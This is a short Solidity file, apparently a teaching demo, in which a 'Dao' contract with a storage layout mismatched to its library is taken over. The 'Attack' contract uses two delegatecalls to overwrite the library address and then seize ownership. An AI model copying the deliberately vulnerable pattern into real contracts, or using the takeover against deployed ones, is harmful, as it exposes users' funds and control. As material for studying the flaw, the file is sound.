// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Each Lib and Dao has different storage layout.
// So Dao expect to update someNumber via delegatecall but it's lib address variable will be updated.
contract Lib {
    uint public someNumber;

    function doSomething(uint _someNumber) public {
        someNumber = _someNumber;
    }
}

contract Dao {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    address public lib;
    address public owner;
    Dao dao;

    constructor(address _dao) {
        dao = Dao(_dao);
    }

    function exploit() public {
        // first call change lib address
        dao.doSomething(uint(uint160(address(this))));
        // second call change owner address
        dao.doSomething(1);
    }

    // In this function we do not care of parameter.
    // Only our concern is to change owner of Dao.
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
